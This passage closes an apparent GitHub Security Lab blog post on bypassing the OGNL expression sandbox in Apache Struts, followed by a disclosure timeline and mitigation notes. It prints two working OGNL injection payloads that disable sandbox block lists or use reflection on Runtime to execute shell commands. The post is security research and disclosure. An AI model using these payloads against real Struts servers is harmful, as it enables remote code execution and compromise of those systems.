You may already be familiar with McOwn’s [technique](https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html). He realized that it was possible to use [OGNL Map notation](https://commons.apache.org/proper/commons-ognl/language-guide.html) to instantiate an `org.apache.commons.collections.BeanMap` by using the `#@org.apache.commons.collections.BeanMap@{ }` syntax, and then it was possible to wrap any Java object on this map and access any getters and setters as map properties. His payload was based on the `org.apache.tomcat.InstanceManager` payload we introduced at [Black Hat 2020](https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf) and looked like:
  
  
  
  (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
  
  (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
  
  (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
  
  (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
  
  (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
  
  (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
  
  (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
  
  (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
  
  (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))
  
  

The payload was basically disabling the OGNL sandbox and then accessing otherwise blocked classes such as `InstanceManager`. There is a simpler way to abuse BeanMaps that do not require to disable the sandbox and that is using reflection:
  
  
  
  (#c=#@org.apache.commons.beanutils.BeanMap@{})+
  
  (#c.setBean(@Runtime@class))+
  
  (#rt=#c['methods'][6].invoke())+
  
  (#c['methods'][12]).invoke(#rt,'touch /tmp/pwned')
  
  

This payload also works in Struts 6 if the `BeanClass` is available in the classpath (either from Apache Commons Collections or Apache Commons BeanUtils), but you need to specify the FQN (Fully Qualified Name) name for `Runtime`: `@java.lang.Runtime@class`.

### Timeline

These bypasses were first reported to the Struts and OGNL security teams on June 9, 2022.

On October 7, 2022, the security team replied to us and stated that improving the block lists was not a sustainable solution, and, therefore, they decided to stop doing it. They highlighted that a [Java Security Manager can be configured](https://struts.apache.org/security/#proactively-protect-from-ognl-expression-injections-attacks-if-easily-applicable) to protect every OGNL evaluation from these attacks and we highly recommend doing so if you are running a Struts application. However, bear in mind that the [Security Manager is deprecated](https://openjdk.org/jeps/411) and will soon get removed from the JDK.

## That’s a wrap

At this point, you will have probably realized that sandboxing an expression language, such as OGNL, is a really difficult task, and may require maintaining a list of blocked classes and OGNL features even though that is not an optimal approach. In this blog post, we have reviewed a few ways in which these sandboxes can be bypassed. Although they are specific to OGNL, hopefully you have learned to explore sandbox controls–and one or two new tricks–that may apply to other sandboxes. In total, we were able to raise $5,600, which we donated to [UNHCR](https://www.unhcr.org/) to help provide refuge for Ukrainians seeking protection from the war.

* * *

## Tags:

  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)

##  Written by 

![Alvaro Munoz](https://avatars.githubusercontent.com/u/125701?v=4&s=200)

###  [Alvaro Munoz](https://github.blog/author/pwntester/)

[@pwntester](https://github.com/pwntester)

  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)

## More on [GitHub Security Lab](https://github.blog/tag/github-security-lab/)

### [Hack the AI agent: Build agentic AI security skills with the GitHub Secure Code Game](https://github.blog/security/hack-the-ai-agent-build-agentic-ai-security-skills-with-the-github-secure-code-game/)

Learn to find and exploit real-world agentic AI vulnerabilities through five progressive challenges in this free, open source game that over 10,000 developers have already used to sharpen their security skills.

[Joseph Katsioloudes](https://github.blog/author/jkcso/ "Posts by Joseph Katsioloudes")

### [Securing the open source supply chain across GitHub](https://github.blog/security/supply-chain-security/securing-the-open-source-supply-chain-across-github/)

Recent attacks on open source focus on exfiltrating secrets; here are the prevention steps you can take today, plus a look at the security capabilities GitHub is working on.

[Zachary Steindler](https://github.blog/author/steiza/ "Posts by Zachary Steindler")

##  Related posts 

![A shield with a checkmark icon appears centered among decorative green blocks.](https://github.blog/wp-content/uploads/2026/01/github-generic-security-blocks-logo.png?resize=400%2C212)

[AI & ML](https://github.blog/ai-and-ml/)

###  [ Making secret scanning more trustworthy: Reducing false positives at scale ](https://github.blog/security/making-secret-scanning-more-trustworthy-reducing-false-positives-at-scale/)

Alerts are more trustworthy and actionable when noise is reduced. See how we improved the verification step with context-aware LLM reasoning.

[Mariko Wakabayashi](https://github.blog/author/mwakaba2/ "Posts by Mariko Wakabayashi")

![A grid of abstract cubes highlights a central cube displaying a shield with a checkmark to represent security.](https://github.blog/wp-content/uploads/2026/01/generic-security-logo-blocks-github.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Investigation update: GitHub Enterprise Server signing key rotation ](https://github.blog/security/investigating-unauthorized-access-to-githubs-internal-repositories/)

GitHub Enterprise Server customers need to take immediate action.

[Alexis Wales](https://github.blog/author/alexiswales/ "Posts by Alexis Wales")

![](https://github.blog/wp-content/uploads/2021/06/GitHub-Bug-Bounty.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Raising the bar: Quality, shared responsibility, and the future of GitHub’s bug bounty program ](https://github.blog/security/raising-the-bar-quality-shared-responsibility-and-the-future-of-githubs-bug-bounty-program/)

We’re updating our bug bounty program standards to prioritize quality submissions, clarify shared responsibility boundaries, and evolve how we reward low-risk findings.

[Jarom Brown](https://github.blog/author/jarombrown/ "Posts by Jarom Brown")

##  Explore more from GitHub 

![Docs](https://github.blog/wp-content/uploads/2024/07/Icon-Circle.svg)

###  Docs 

Everything you need to master GitHub, all in one place.

[ Go to Docs ](https://docs.github.com/)

![GitHub](https://github.blog/wp-content/uploads/2024/07/recirculation-github-icon.svg)

###  GitHub 

Build what’s next on GitHub, the place for anyone from anywhere to build anything.

[ Start building ](https://github.com/)

![Customer stories](https://github.blog/wp-content/uploads/2024/07/Icon_da43dc.svg)

###  Customer stories 

Meet the companies and engineering teams that build with GitHub.

[ Learn more ](https://github.com/customer-stories)

![GitHub Universe 2026](https://github.blog/wp-content/uploads/2025/06/Universe26-Icon.svg)

###  GitHub Universe 2026 

Join us October 28-29 in San Francisco or online for GitHub Universe, our flagship developer event uniting people, agents, and the world’s code.

[ Register now ](https://githubuniverse.com/?utm_source=Blog&utm_medium=GitHub&utm_campaign=module_uni_26)

## We do newsletters, too

Discover tips, technical guides, and best practices in our biweekly newsletter just for devs.

Your email address

* Your email address

Subscribe

Yes please, I’d like GitHub and affiliates to use my information for personalized communications, targeted advertising and campaign effectiveness. See the [GitHub Privacy Statement](https://github.com/site/privacy) for more details. 

Subscribe
